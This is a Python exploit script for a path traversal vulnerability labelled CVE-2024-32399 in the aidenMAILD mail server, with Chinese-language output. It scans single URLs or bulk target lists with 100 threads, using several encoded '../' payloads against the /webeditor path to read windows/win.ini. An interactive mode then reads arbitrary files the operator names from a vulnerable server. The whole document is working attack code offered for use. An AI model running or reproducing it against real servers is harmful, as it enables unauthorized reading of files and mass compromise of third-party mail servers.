import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = r"""
     .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _______     | || |      __      | || |  ________    | || |     _____    | || |  _________   | || | ____  _____  | |
| | |_   __ \    | || |     /  \     | || | |_   ___ `.  | || |    |_   _|   | || | |_   ___  |  | || ||_   \|_   _| | |
| |   | |__) |   | || |    / /\ \    | || |   | |   `. \ | || |      | |     | || |   | |_  \_|  | || |  |   \ | |   | |
| |   |  __ /    | || |   / ____ \   | || |   | |    | | | || |      | |     | || |   |  _|  _   | || |  | |\ \| |   | |
| |  _| |  \ \_  | || | _/ /    \ \_ | || |  _| |___.' / | || |     _| |_    | || |  _| |___/ |  | || | _| |_\   |_  | |
| | |____| |___| | || ||____|  |____|| || | |________.'  | || |    |_____|   | || | |_________|  | || ||_____|\____| | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="aidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payloads = [
        "/webeditor/../../../windows/win.ini",
        "/webeditor/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
        "/webeditor/%252e%252e/%252e%252e/%252e%252e/windows/win.ini",
        "/webeditor/....//....//....//windows/win.ini",
        "/webeditor/....\/....\/....\/windows/win.ini"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/118.0.0.0Safari/537.36",
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res1 = requests.get(url=target, headers=headers, verify=False)
        if res1.status_code == 200:
            for payload in payloads:
                res2 = requests.get(url=target + payload, headers=headers, verify=False)
                if res2.status_code == 200 and "fonts" in res2.text:
                    print(f"[+] {target} 存在漏洞")
                    with open("result4.txt", 'a') as f:
                        f.write(target + '\n')
                        return True
                else:
                    print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


def exp(target):
    while True:
        headers = {
            "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/118.0.0.0Safari/537.36",
        }
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

        cmd = input("请输入想要读取的文件路径: ")
        payloads = [
        "/webeditor/../../../",
        "/webeditor/%2e%2e/%2e%2e/%2e%2e/",
        "/webeditor/%252e%252e/%252e%252e/%252e%252e/",
        "/webeditor/....//....//....//",
        "/webeditor/....\/....\/....\/"
        ]
        for payload in payloads:
            if cmd == 'q':
                exit()
            res2 = requests.get(url=target + payload + cmd, headers=headers, verify=False, timeout=5)
            if res2.status_code == 200:
                res3 = requests.get(url=target + payload + cmd, headers=headers, verify=False, timeout=5)
                if res3.text == "":
                    print("不存在")
                else:
                    print(res3.text)


if __name__ == '__main__':
    main()
